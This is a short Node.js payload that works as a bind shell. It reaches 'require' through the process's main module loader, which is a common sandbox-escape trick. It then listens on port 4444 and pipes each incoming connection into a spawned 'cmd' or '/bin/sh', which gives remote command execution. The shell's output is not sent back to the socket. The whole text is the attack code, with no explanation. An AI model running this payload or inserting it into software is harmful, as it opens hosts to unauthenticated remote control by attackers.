(() => {
  var require = global.require || global.process.mainModule.constructor._load;
  var cmd = global.process.platform.match(/^win/i) ? "cmd" : "/bin/sh";
  var net = require("net"),
    cp = require("child_process");
  var server = net.createServer((socket) => {
    var sh = cp.spawn(cmd, []);
    socket.pipe(sh.stdin);
  });
  console.log("Connecting")
  server.listen(4444);
})();
